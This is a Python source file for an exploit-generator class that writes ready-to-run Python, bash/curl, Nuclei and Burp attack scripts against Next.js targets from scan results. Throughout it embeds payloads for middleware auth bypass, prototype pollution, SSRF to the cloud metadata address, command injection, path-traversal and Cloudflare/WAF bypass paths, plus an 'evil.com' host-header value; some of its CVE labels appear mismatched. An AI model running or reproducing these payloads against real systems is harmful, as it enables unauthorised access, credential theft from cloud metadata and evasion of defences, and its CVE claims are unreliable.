#!/usr/bin/env python3
"""
POC Generator - Auto-generate exploit POC from scan results
Enhanced with Next.js RSC RCE payloads (CVE-2024-34351, CVE-2025-55182, CVE-2025-66478)
"""

import os
import re
import json
from urllib.parse import urlparse
from datetime import datetime
from colorama import Fore, Style

from utils.payloads import POC_TEMPLATES


class POCGenerator:
    """Auto-generate exploit POC from scan results"""
    
    # Next.js RSC RCE specific payloads
    NEXTJS_RSC_PAYLOADS = {
        'middleware_bypass': [
            {"header": "x-middleware-subrequest", "value": "1"},
            {"header": "x-middleware-subrequest", "value": "middleware"},
            {"header": "x-middleware-subrequest", "value": "src/middleware"},
            {"header": "x-middleware-subrequest", "value": "middleware:middleware"},
        ],
        'rsc_streaming': [
            {"headers": {"rsc": "1", "Accept": "text/x-component"}, "path": "/"},
            {"headers": {"rsc": "1", "Accept": "text/x-component"}, "path": "/_rsc"},
            {"headers": {"next-rsc-flight": "1", "rsc": "1"}, "path": "/"},
            {"headers": {"Accept": "text/x-component", "x-middleware-subrequest": "1"}, "path": "/_rsc"},
        ],
        'server_actions': [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "text/plain;charset=UTF-8", "Next-Action": "test"},
                "body": '["$K1"]'
            },
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/json", "Next-Action": "test", "x-middleware-subrequest": "1"},
                "body": '{"test": true}'
            },
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/json", "Next-Action": "proto", "x-action-encrypted": "false"},
                "body": '{"__proto__":{"admin":true}}'
            },
        ],
        'manifest_paths': [
            "/.next/build-manifest.json",
            "/.next/server-reference-manifest.json",
            "/.next/routes-manifest.json",
            "/.next/middleware-manifest.json",
            "/_next/static/chunks/main.js.map",
        ],
        'ssrf_payloads': [
            {"url": "http://127.0.0.1/", "desc": "localhost"},
            {"url": "http://169.254.169.254/latest/meta-data/", "desc": "AWS metadata"},
            {"url": "http://[::1]/", "desc": "IPv6 localhost"},
        ],
        'cmd_payloads': [
            '{"cmd":";id"}',
            '{"cmd":"|id"}',
            '{"cmd":"$(id)"}',
            '{"cmd":"`id`"}',
        ]
    }
    
    def __init__(self, results):
        self.results = results
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def generate_all(self, output_dir="pocs"):
        """Generate POCs for all vulnerable targets"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        generated = []
        
        for result in self.results:
            if result.get('waf_bypass') or result.get('findings'):
                target = result['target']
                hostname = urlparse(target).hostname
                safe_name = re.sub(r'[^a-zA-Z0-9]', '_', hostname)
                
                # Generate Python POC
                py_file = os.path.join(output_dir, f"poc_{safe_name}.py")
                self._generate_python_poc(result, py_file)
                generated.append(py_file)
                
                # Generate Curl POC
                sh_file = os.path.join(output_dir, f"poc_{safe_name}.sh")
                self._generate_curl_poc(result, sh_file)
                generated.append(sh_file)
                
                # Generate Nuclei template
                yaml_file = os.path.join(output_dir, f"nuclei_{safe_name}.yaml")
                self._generate_nuclei_template(result, yaml_file)
                generated.append(yaml_file)
                
                # Generate Burp requests
                burp_file = os.path.join(output_dir, f"burp_{safe_name}.txt")
                self._generate_burp_requests(result, burp_file)
                generated.append(burp_file)
                
                # Check if Next.js RSC RCE was detected and generate specific POC
                nextjs_findings = [f for f in result.get('findings', []) 
                                   if 'next' in f.get('type', '').lower() or 
                                      'rsc' in f.get('type', '').lower() or
                                      'server action' in f.get('type', '').lower()]
                
                if nextjs_findings:
                    # Generate comprehensive Next.js RSC RCE POC
                    nextjs_py = os.path.join(output_dir, f"nextjs_rsc_rce_{safe_name}.py")
                    self._generate_nextjs_rsc_poc(result, nextjs_py)
                    generated.append(nextjs_py)
                    
                    nextjs_sh = os.path.join(output_dir, f"nextjs_rsc_rce_{safe_name}.sh")
                    self._generate_nextjs_curl_poc(result, nextjs_sh)
                    generated.append(nextjs_sh)
                    
                    # Generate comprehensive Nuclei template for Next.js
                    nextjs_yaml = os.path.join(output_dir, f"nuclei_nextjs_rsc_{safe_name}.yaml")
                    self._generate_nextjs_nuclei_template(result, nextjs_yaml)
                    generated.append(nextjs_yaml)
        
        return generated
    
    def _get_payloads_for_result(self, result):
        """Extract successful payloads from findings"""
        payloads = []
        for finding in result.get('findings', []):
            if finding.get('url'):
                parsed = urlparse(finding['url'])
                path = parsed.path
                if parsed.query:
                    path += f"?{parsed.query}"
                payloads.append(path)
        return payloads
    
    def _get_origin_ip(self, result):
        """Get origin IP from result"""
        origin_ips = result.get('origin_ips', [])
        if origin_ips:
            return origin_ips[0].get('ip', 'N/A')
        
        # Check findings for origin IP
        for finding in result.get('findings', []):
            if finding.get('origin_ips'):
                return finding['origin_ips'][0].get('ip', 'N/A')
        
        return 'N/A'
    
    def _generate_python_poc(self, result, filename):
        """Generate Python exploit POC"""
        target = result['target']
        hostname = urlparse(target).hostname
        origin_ip = self._get_origin_ip(result)
        payloads = self._get_payloads_for_result(result)
        
        # Build custom headers based on findings
        custom_headers = []
        for finding in result.get('findings', []):
            if finding.get('type') == 'Host Header Injection':
                header = finding.get('header', '')
                if header:
                    custom_headers.append(f'"{header}": "evil.com",')
        
        custom_headers_str = "\n        ".join(custom_headers) if custom_headers else '# No custom headers'
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        poc_content = POC_TEMPLATES['python'].format(
            target=target,
            hostname=hostname,
            origin_ip=origin_ip,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            payloads=json.dumps(payloads, indent=4),
            custom_headers=custom_headers_str
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_curl_poc(self, result, filename):
        """Generate Curl/Bash exploit POC"""
        target = result['target']
        hostname = urlparse(target).hostname
        origin_ip = self._get_origin_ip(result)
        payloads = self._get_payloads_for_result(result)
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        # Build curl commands
        curl_commands = []
        for payload in payloads[:10]:  # Limit to 10
            curl_commands.append(f'curl -k -s -o /dev/null -w "%{{http_code}}" "$TARGET{payload}"')
            curl_commands.append(f'echo " - {payload[:60]}"')
        
        poc_content = POC_TEMPLATES['curl'].format(
            target=target,
            hostname=hostname,
            origin_ip=origin_ip,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            curl_commands="\n".join(curl_commands)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_nextjs_rsc_poc(self, result, filename):
        """Generate comprehensive Next.js RSC RCE POC (Python)"""
        target = result['target']
        hostname = urlparse(target).hostname
        
        # Get detected CVEs from findings
        cves = []
        for finding in result.get('findings', []):
            if finding.get('cve'):
                cves.append(finding['cve'])
        cves = list(set(cves)) if cves else ['CVE-2024-34351', 'CVE-2025-55182', 'CVE-2025-66478']
        
        poc_content = f'''#!/usr/bin/env python3
"""
Next.js RSC/Server Actions RCE POC
Target: {target}
CVE: {", ".join(cves)}
Generated: {self.timestamp}

DISCLAIMER: For authorized security testing only!
"""

import requests
import urllib3
import json
import sys
urllib3.disable_warnings()

TARGET = "{target}"

class NextJSExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({{
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        }})
    
    def test_middleware_bypass(self):
        """CVE-2024-34351: Middleware bypass via x-middleware-subrequest"""
        print("\\n[*] Testing CVE-2024-34351: Middleware Bypass")
        print("=" * 60)
        
        bypass_headers = [
            {{"x-middleware-subrequest": "1"}},
            {{"x-middleware-subrequest": "middleware"}},
            {{"x-middleware-subrequest": "src/middleware"}},
            {{"x-middleware-subrequest": "pages/_middleware"}},
            {{"x-middleware-subrequest": "middleware:middleware"}},
            {{"x-middleware-subrequest": "src/middleware:src/middleware"}},
        ]
        
        paths = ["/", "/admin", "/api/", "/api/admin", "/_next/server/app/", "/_next/data/"]
        
        for path in paths:
            for headers in bypass_headers:
                try:
                    resp = self.session.get(
                        f"{{self.target}}{{path}}",
                        headers=headers,
                        timeout=10,
                        allow_redirects=False
                    )
                    header_str = list(headers.values())[0]
                    
                    if resp.status_code == 200:
                        print(f"[+] BYPASS! {{path}} | Header: {{header_str}} | Status: {{resp.status_code}} | Len: {{len(resp.content)}}")
                    elif resp.status_code in [301, 302, 307, 308]:
                        location = resp.headers.get('location', 'N/A')
                        print(f"[>] Redirect {{path}} -> {{location[:50]}}")
                except Exception as e:
                    pass
    
    def test_rsc_streaming(self):
        """CVE-2025-55182: RSC Streaming Response RCE"""
        print("\\n[*] Testing CVE-2025-55182: RSC Streaming RCE")
        print("=" * 60)
        
        rsc_headers = [
            {{"rsc": "1", "Accept": "text/x-component"}},
            {{"rsc": "1", "Accept": "application/octet-stream"}},
            {{"next-rsc-flight": "1"}},
            {{"x-rsc-content-type": "text/x-component"}},
            {{"Accept": "text/x-component", "x-middleware-subrequest": "1"}},
            {{"rsc": "1", "next-action": "true"}},
        ]
        
        paths = ["/", "/_rsc", "/__rsc__", "/_next/rsc/", "/_next/flight/", "/_next/stream/",
                 "/.well-known/acme-challenge/test/../_rsc"]
        
        for path in paths:
            for headers in rsc_headers:
                try:
                    resp = self.session.get(f"{{self.target}}{{path}}", headers=headers, timeout=10)
                    content_type = resp.headers.get('content-type', '')
                    
                    if 'text/x-component' in content_type:
                        print(f"[!] RSC STREAMING FOUND! {{path}}")
                        print(f"    Content-Type: {{content_type}}")
                        print(f"    Response: {{resp.text[:200]}}")
                    elif resp.status_code == 200 and any(x in resp.text for x in ['$undefined', '$Sreact', '__flight__']):
                        print(f"[+] RSC Data: {{path}} | Status: {{resp.status_code}}")
                        print(f"    Snippet: {{resp.text[:150]}}")
                except Exception as e:
                    pass
    
    def test_server_actions(self):
        """CVE-2025-66478: Server Actions Deserialization RCE"""
        print("\\n[*] Testing CVE-2025-66478: Server Actions Deserialization")
        print("=" * 60)
        
        action_payloads = [
            {{
                "path": "/",
                "headers": {{"Content-Type": "text/plain;charset=UTF-8", "Next-Action": "c3ab8ff13720e8ad9047dd39466b3c8974e592c", "Next-Router-State-Tree": "%5B%22%22%5D"}},
                "body": '["$K1"]'
            }},
            {{
                "path": "/",
                "headers": {{"Content-Type": "application/json", "Next-Action": "test-action", "x-middleware-subrequest": "1"}},
                "body": '{{"test": true}}'
            }},
            {{
                "path": "/",
                "headers": {{"Content-Type": "application/json", "Next-Action": "proto-pollute", "x-action-encrypted": "false", "x-middleware-subrequest": "1"}},
                "body": '{{"__proto__":{{"admin":true}},"constructor":{{"prototype":{{"admin":true}}}}}}'
            }},
            {{
                "path": "/",
                "headers": {{"Content-Type": "multipart/form-data; boundary=----NextFormBoundary", "Next-Action": "form-action", "x-server-action": "1", "x-middleware-subrequest": "1"}},
                "body": "------NextFormBoundary\\r\\nContent-Disposition: form-data; name=\\"action\\"\\r\\n\\r\\ntest\\r\\n------NextFormBoundary--"
            }},
        ]
        
        for payload in action_payloads:
            try:
                resp = self.session.post(
                    f"{{self.target}}{{payload['path']}}",
                    headers=payload['headers'],
                    data=payload['body'],
                    timeout=10,
                    allow_redirects=False
                )
                
                action_id = payload['headers'].get('Next-Action', 'unknown')
                content_type = resp.headers.get('content-type', '')
                
                if resp.status_code == 200:
                    print(f"[+] Action Response! Action: {{action_id}}")
                    print(f"    Status: {{resp.status_code}} | Content-Type: {{content_type}}")
                    print(f"    Response: {{resp.text[:200]}}")
                elif resp.status_code != 404:
                    print(f"[?] Action: {{action_id}} | Status: {{resp.status_code}}")
                    
            except Exception as e:
                pass
    
    def test_manifest_exposure(self):
        """Test for sensitive manifest file exposure"""
        print("\\n[*] Testing Manifest/Config Exposure")
        print("=" * 60)
        
        manifests = [
            "/.next/server-reference-manifest.json",
            "/.next/build-manifest.json",
            "/.next/app-build-manifest.json",
            "/.next/routes-manifest.json",
            "/.next/middleware-manifest.json",
            "/.next/prerender-manifest.json",
            "/.next/react-loadable-manifest.json",
            "/_next/static/chunks/app/page.js",
            "/_next/static/chunks/main.js.map",
            "/.well-known/acme-challenge/test/../.next/build-manifest.json",
            "/.well-known/acme-challenge/test/../.next/server-reference-manifest.json",
        ]
        
        for path in manifests:
            try:
                resp = self.session.get(
                    f"{{self.target}}{{path}}",
                    headers={{"x-middleware-subrequest": "1"}},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    print(f"[+] EXPOSED: {{path}}")
                    try:
                        data = resp.json()
                        print(f"    Keys: {{list(data.keys())[:5]}}")
                    except:
                        print(f"    Size: {{len(resp.content)}} bytes")
            except Exception as e:
                pass
    
    def test_ssrf_via_action(self):
        """Test SSRF via Server Action redirect"""
        print("\\n[*] Testing SSRF via Server Actions")
        print("=" * 60)
        
        ssrf_targets = [
            "http://127.0.0.1/",
            "http://localhost:3000/",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/",
        ]
        
        for ssrf_url in ssrf_targets:
            try:
                resp = self.session.post(
                    f"{{self.target}}/",
                    headers={{
                        "Content-Type": "application/json",
                        "Next-Action": "ssrf-test",
                        "x-action-redirect": ssrf_url,
                        "x-middleware-subrequest": "1"
                    }},
                    data=json.dumps({{"url": ssrf_url}}),
                    timeout=10,
                    allow_redirects=False
                )
                
                if resp.status_code in [301, 302, 307, 308]:
                    location = resp.headers.get('location', '')
                    print(f"[!] SSRF Redirect: {{ssrf_url}}")
                    print(f"    Location: {{location}}")
                elif resp.status_code == 200 and ssrf_url in resp.text:
                    print(f"[!] SSRF Response contains target URL!")
                    
            except Exception as e:
                pass
    
    def test_command_injection(self):
        """Test command injection via Server Actions"""
        print("\\n[*] Testing Command Injection via Server Actions")
        print("=" * 60)
        
        cmd_payloads = [
            '{{"cmd":";id"}}',
            '{{"cmd":"|id"}}',
            '{{"cmd":"$(id)"}}',
            '{{"cmd":"`id`"}}',
            '{{"cmd":"\\\\u003b\\\\u0069\\\\u0064"}}',
        ]
        
        for payload in cmd_payloads:
            try:
                resp = self.session.post(
                    f"{{self.target}}/",
                    headers={{
                        "Content-Type": "application/json",
                        "Next-Action": "cmd-test",
                        "x-middleware-subrequest": "1"
                    }},
                    data=payload,
                    timeout=10
                )
                
                if any(x in resp.text.lower() for x in ['uid=', 'gid=', 'root', 'www-data']):
                    print(f"[!] COMMAND EXECUTION DETECTED!")
                    print(f"    Payload: {{payload}}")
                    print(f"    Response: {{resp.text[:300]}}")
                    
            except Exception as e:
                pass
    
    def test_waf_bypass_payloads(self):
        """Test WAF bypass techniques"""
        print("\\n[*] Testing WAF Bypass Techniques")
        print("=" * 60)
        
        waf_bypass = [
            # URL encoding
            ("/%2e%2e/%2e%2e/_next/server-action", "URL encoded"),
            ("/%252e%252e/%252e%252e/_next/data/", "Double URL encoded"),
            # Unicode
            ("/..%c0%af..%c0%af_next/server-action", "Unicode overlong"),
            ("/..%ef%bc%8f..%ef%bc%8f_rsc", "Fullwidth solidus"),
            # ACME path
            ("/.well-known/acme-challenge/test/../__server_action__", "ACME bypass"),
            ("/.well-known/acme-challenge/test/..%2f..%2f_rsc", "ACME + URL encode"),
            # Cloudflare specific
            ("/cdn-cgi/../_next/server-action", "CF path bypass"),
        ]
        
        for path, desc in waf_bypass:
            try:
                resp = self.session.get(
                    f"{{self.target}}{{path}}",
                    headers={{"x-middleware-subrequest": "1"}},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    print(f"[+] WAF BYPASS: {{desc}}")
                    print(f"    Path: {{path}}")
                    print(f"    Status: {{resp.status_code}} | Size: {{len(resp.content)}}")
            except Exception as e:
                pass
    
    def run_all(self):
        """Run all exploit tests"""
        print(f"\\n{{'='*60}}")
        print(f"Next.js RSC/Server Actions RCE POC")
        print(f"Target: {{self.target}}")
        print(f"{{'='*60}}")
        
        self.test_middleware_bypass()
        self.test_rsc_streaming()
        self.test_server_actions()
        self.test_manifest_exposure()
        self.test_ssrf_via_action()
        self.test_command_injection()
        self.test_waf_bypass_payloads()
        
        print(f"\\n{{'='*60}}")
        print("[*] Scan Complete")
        print(f"{{'='*60}}")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    exploit = NextJSExploit(target)
    exploit.run_all()
'''
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_nextjs_curl_poc(self, result, filename):
        """Generate comprehensive Next.js RSC RCE POC (Bash/Curl)"""
        target = result['target']
        hostname = urlparse(target).hostname
        
        # Get detected CVEs
        cves = []
        for finding in result.get('findings', []):
            if finding.get('cve'):
                cves.append(finding['cve'])
        cves = list(set(cves)) if cves else ['CVE-2024-34351', 'CVE-2025-55182', 'CVE-2025-66478']
        
        poc_content = f'''#!/bin/bash
# Next.js RSC/Server Actions RCE POC
# Target: {target}
# CVE: {", ".join(cves)}
# Generated: {self.timestamp}
# DISCLAIMER: For authorized security testing only!

TARGET="{target}"

echo "============================================================"
echo "Next.js RSC/Server Actions RCE POC"
echo "Target: $TARGET"
echo "============================================================"

# ============================================
# CVE-2024-34351: Middleware Bypass
# ============================================
echo ""
echo "[*] Testing CVE-2024-34351: Middleware Bypass"
echo "============================================"

for header_val in "1" "middleware" "src/middleware" "middleware:middleware"; do
    echo "[+] x-middleware-subrequest: $header_val"
    curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
        -H "x-middleware-subrequest: $header_val" \\
        "$TARGET/" | head -c 100
    echo ""
done

# Test protected paths
for path in "/admin" "/api/" "/_next/server/app/" "/_next/data/"; do
    echo "[+] Path: $path"
    curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
        -H "x-middleware-subrequest: 1" \\
        "$TARGET$path" | head -c 100
    echo ""
done

# ============================================
# CVE-2025-55182: RSC Streaming RCE
# ============================================
echo ""
echo "[*] Testing CVE-2025-55182: RSC Streaming RCE"
echo "============================================"

echo "[+] RSC header with text/x-component"
curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
    -H "rsc: 1" -H "Accept: text/x-component" \\
    "$TARGET/" | head -c 200
echo ""

echo "[+] next-rsc-flight header"
curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
    -H "next-rsc-flight: 1" -H "rsc: 1" \\
    "$TARGET/" | head -c 200
echo ""

for path in "/_rsc" "/__rsc__" "/_next/rsc/" "/_next/flight/"; do
    echo "[+] RSC endpoint: $path"
    curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
        -H "Accept: text/x-component" -H "rsc: 1" \\
        "$TARGET$path" | head -c 100
    echo ""
done

# ============================================
# CVE-2025-66478: Server Actions Deserialization
# ============================================
echo ""
echo "[*] Testing CVE-2025-66478: Server Actions Deserialization"
echo "============================================"

echo "[+] Basic Server Action"
curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
    -X POST \\
    -H "Content-Type: text/plain;charset=UTF-8" \\
    -H "Next-Action: c3ab8ff13720e8ad9047dd39466b3c8974e592c" \\
    -H "Next-Router-State-Tree: %5B%22%22%5D" \\
    -d '["$K1"]' \\
    "$TARGET/" | head -c 200
echo ""

echo "[+] Server Action with middleware bypass"
curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
    -X POST \\
    -H "Content-Type: application/json" \\
    -H "Next-Action: test-action" \\
    -H "x-middleware-subrequest: 1" \\
    -d '{{"test": true}}' \\
    "$TARGET/" | head -c 200
echo ""

echo "[+] Prototype pollution"
curl -k -s -w "    Status: %{{http_code}} | Content-Type: %{{content_type}}\\n" \\
    -X POST \\
    -H "Content-Type: application/json" \\
    -H "Next-Action: proto-pollute" \\
    -H "x-action-encrypted: false" \\
    -H "x-middleware-subrequest: 1" \\
    -d '{{"__proto__":{{"admin":true}},"constructor":{{"prototype":{{"admin":true}}}}}}' \\
    "$TARGET/" | head -c 200
echo ""

# ============================================
# Manifest/Config Exposure
# ============================================
echo ""
echo "[*] Testing Manifest/Config Exposure"
echo "============================================"

for path in "/.next/build-manifest.json" "/.next/server-reference-manifest.json" "/.next/routes-manifest.json" "/_next/static/chunks/main.js.map"; do
    echo "[+] $path"
    curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
        -H "x-middleware-subrequest: 1" \\
        "$TARGET$path" | head -c 100
    echo ""
done

# ACME bypass
echo "[+] ACME bypass: build-manifest.json"
curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
    "$TARGET/.well-known/acme-challenge/test/../.next/build-manifest.json" | head -c 100
echo ""

# ============================================
# SSRF via Server Action
# ============================================
echo ""
echo "[*] Testing SSRF via Server Actions"
echo "============================================"

for ssrf in "http://127.0.0.1/" "http://169.254.169.254/latest/meta-data/"; do
    echo "[+] SSRF: $ssrf"
    curl -k -s -w "    Status: %{{http_code}}\\n" \\
        -X POST \\
        -H "Content-Type: application/json" \\
        -H "Next-Action: ssrf-test" \\
        -H "x-action-redirect: $ssrf" \\
        -H "x-middleware-subrequest: 1" \\
        -d "{{\\"url\\":\\"$ssrf\\"}}" \\
        "$TARGET/" | head -c 200
    echo ""
done

# ============================================
# Command Injection
# ============================================
echo ""
echo "[*] Testing Command Injection"
echo "============================================"

for cmd in ';id' '|id' '$(id)' '\\`id\\`'; do
    echo "[+] Payload: $cmd"
    curl -k -s -w "    Status: %{{http_code}}\\n" \\
        -X POST \\
        -H "Content-Type: application/json" \\
        -H "Next-Action: cmd-test" \\
        -H "x-middleware-subrequest: 1" \\
        -d "{{\\"cmd\\":\\"$cmd\\"}}" \\
        "$TARGET/" | grep -E "(uid=|gid=|root|www-data)" || echo "    No execution detected"
done

# ============================================
# WAF Bypass Techniques
# ============================================
echo ""
echo "[*] Testing WAF Bypass Techniques"
echo "============================================"

echo "[+] URL encoded path"
curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
    -H "x-middleware-subrequest: 1" \\
    "$TARGET/%2e%2e/%2e%2e/_next/server-action" | head -c 100
echo ""

echo "[+] Unicode overlong"
curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
    -H "x-middleware-subrequest: 1" \\
    "$TARGET/..%c0%af..%c0%af_next/server-action" | head -c 100
echo ""

echo "[+] ACME + Server Action"
curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
    -H "x-middleware-subrequest: 1" \\
    "$TARGET/.well-known/acme-challenge/test/../__server_action__" | head -c 100
echo ""

echo "[+] Cloudflare path bypass"
curl -k -s -w "    Status: %{{http_code}} | Size: %{{size_download}}\\n" \\
    -H "x-middleware-subrequest: 1" \\
    "$TARGET/cdn-cgi/../_next/server-action" | head -c 100
echo ""

echo ""
echo "============================================================"
echo "[*] POC Complete"
echo "============================================================"
'''
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_nuclei_template(self, result, filename):
        """Generate Nuclei YAML template"""
        target = result['target']
        hostname = urlparse(target).hostname
        safe_name = re.sub(r'[^a-zA-Z0-9]', '-', hostname)
        payloads = self._get_payloads_for_result(result)
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        # Build nuclei requests
        nuclei_requests = []
        for i, payload in enumerate(payloads[:5]):  # Limit to 5
            nuclei_requests.append(f'''  - method: GET
    path:
      - "{{{{BaseURL}}}}{payload}"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 302
      - type: word
        words:
          - "actuator"
          - "password"
          - "secret"
        condition: or
''')
        
        poc_content = POC_TEMPLATES['nuclei'].format(
            target=target,
            target_safe=safe_name,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            nuclei_requests="\n".join(nuclei_requests)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_burp_requests(self, result, filename):
        """Generate Burp Suite request format"""
        target = result['target']
        parsed = urlparse(target)
        hostname = parsed.hostname
        payloads = self._get_payloads_for_result(result)
        
        burp_requests = []
        for payload in payloads[:10]:
            burp_requests.append(f'''GET {payload} HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0
Accept: */*
Connection: close

---
''')
        
        poc_content = POC_TEMPLATES['burp'].format(
            target=target,
            timestamp=self.timestamp,
            burp_requests="\n".join(burp_requests)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_nextjs_nuclei_template(self, result, filename):
        """Generate comprehensive Nuclei template for Next.js RSC RCE"""
        target = result['target']
        hostname = urlparse(target).hostname
        safe_name = re.sub(r'[^a-zA-Z0-9]', '-', hostname)
        
        # Get detected CVEs
        cves = []
        for finding in result.get('findings', []):
            if finding.get('cve'):
                cves.append(finding['cve'])
        cves = list(set(cves)) if cves else ['CVE-2024-34351', 'CVE-2025-55182', 'CVE-2025-66478']
        
        poc_content = f'''id: nextjs-rsc-rce-{safe_name}

info:
  name: Next.js RSC/Server Actions RCE - {hostname}
  author: CloudflareACMEScanner
  severity: critical
  description: |
    Comprehensive Next.js RSC/Server Actions RCE vulnerability check.
    Tests for CVE-2024-34351 (Middleware Bypass), CVE-2025-55182 (RSC Streaming RCE),
    and CVE-2025-66478 (Server Actions Deserialization).
  reference:
    - https://github.com/vercel/next.js/security/advisories
    - https://assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
  metadata:
    verified: false
    timestamp: {self.timestamp}
  tags: nextjs,rce,cve-2024-34351,cve-2025-55182,cve-2025-66478,waf-bypass
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: {",".join(cves)}
    cwe-id: CWE-918,CWE-502,CWE-287

http:
  # ============================================
  # CVE-2024-34351: Middleware Bypass
  # ============================================
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{{{Hostname}}}}
        x-middleware-subrequest: 1
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'len(body) > 100'

  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{{{Hostname}}}}
        x-middleware-subrequest: middleware
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 301
          - 302
      - type: dsl
        dsl:
          - '!contains(body, "unauthorized")'

  # ============================================
  # CVE-2025-55182: RSC Streaming RCE
  # ============================================
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{{{Hostname}}}}
        rsc: 1
        Accept: text/x-component
        User-Agent: Mozilla/5.0

    matchers-condition: or
    matchers:
      - type: word
        part: header
        words:
          - "text/x-component"
      - type: word
        part: body
        words:
          - "$undefined"
          - "$Sreact"
          - "__flight__"
        condition: or

  - raw:
      - |
        GET /_rsc HTTP/1.1
        Host: {{{{Hostname}}}}
        rsc: 1
        next-rsc-flight: 1
        Accept: text/x-component
        User-Agent: Mozilla/5.0

    matchers:
      - type: status
        status:
          - 200

  # ============================================
  # CVE-2025-66478: Server Actions
  # ============================================
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{{{Hostname}}}}
        Content-Type: text/plain;charset=UTF-8
        Next-Action: c3ab8ff13720e8ad9047dd39466b3c8974e592c
        Next-Router-State-Tree: %5B%22%22%5D
        User-Agent: Mozilla/5.0
        
        ["$K1"]

    matchers-condition: or
    matchers:
      - type: word
        part: header
        words:
          - "text/x-component"
          - "x-action-"
        condition: or
      - type: word
        part: body
        words:
          - "$undefined"
          - "actionResult"
        condition: or

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{{{Hostname}}}}
        Content-Type: application/json
        Next-Action: proto-pollute
        x-action-encrypted: false
        x-middleware-subrequest: 1
        User-Agent: Mozilla/5.0
        
        {{"__proto__":{{"admin":true}}}}

    matchers:
      - type: status
        status:
          - 200

  # ============================================
  # Manifest/Config Exposure
  # ============================================
  - raw:
      - |
        GET /.next/build-manifest.json HTTP/1.1
        Host: {{{{Hostname}}}}
        x-middleware-subrequest: 1
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "pages"
          - "polyfillFiles"
        condition: or

  - raw:
      - |
        GET /.well-known/acme-challenge/test/../.next/build-manifest.json HTTP/1.1
        Host: {{{{Hostname}}}}
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "pages"
        condition: or

  # ============================================
  # WAF Bypass Techniques
  # ============================================
  - raw:
      - |
        GET /%2e%2e/%2e%2e/_next/server-action HTTP/1.1
        Host: {{{{Hostname}}}}
        x-middleware-subrequest: 1
        User-Agent: Mozilla/5.0

    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /cdn-cgi/../_next/server-action HTTP/1.1
        Host: {{{{Hostname}}}}
        x-middleware-subrequest: 1
        User-Agent: Mozilla/5.0

    matchers:
      - type: status
        status:
          - 200
'''
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
